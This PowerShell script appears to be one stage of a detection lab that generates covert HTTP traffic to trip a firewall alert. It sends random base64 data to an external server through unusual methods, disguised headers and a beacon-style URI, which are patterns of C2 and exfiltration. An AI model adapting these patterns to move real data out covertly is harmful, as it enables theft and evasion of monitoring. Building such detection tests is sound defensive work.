<#
    Stage 5 - Covert HTTP channel / exfil  (EAL: C2/Exfil)
    ======================================================
    The implant hides activity inside uncommon HTTP - odd methods, encoded
    payloads in headers/body, mismatched content - to exfiltrate data or pull
    tooling while blending into web traffic.

      EAL alert : 'HTTP with suspicious characteristics'
      ATT&CK    : Command & Control / Exfiltration (TA0011/TA0010) /
                  Web Service (T1102), Exfiltration Over Web Service (T1567)
      Severity  : Low   Source: PAN Firewall EAL Logs (or XDR agent)
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_traffic.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

Write-Stage "STAGE 5: Covert HTTP to $($cfg.ExternalServer)" "INFO"
$blob = ([Convert]::ToBase64String((1..256 | ForEach-Object { Get-Random -Max 256 })))
$hdr  = @{ "X-Session-Data"=$blob; "Accept"="*/*"; "Content-Type"="image/gif" }

Invoke-BadHttp -BaseUrl $cfg.ExternalServer -Path "/upload" -Method "PUT"  -Headers $hdr -Body $blob -Label "covert-put"
Invoke-BadHttp -BaseUrl $cfg.ExternalServer -Path "/api"    -Method "PATCH" -Headers $hdr -Body $blob -Label "odd-method"
Invoke-BadHttp -BaseUrl $cfg.ExternalServer -Path "/pixel.gif?d=$blob" -Headers @{ "User-Agent"="beacon/1.0" } -Label "data-in-uri"

Write-Stage "STAGE 5 done. Expect EAL: 'HTTP with suspicious characteristics' (rule 7fbfd969)." "OK"
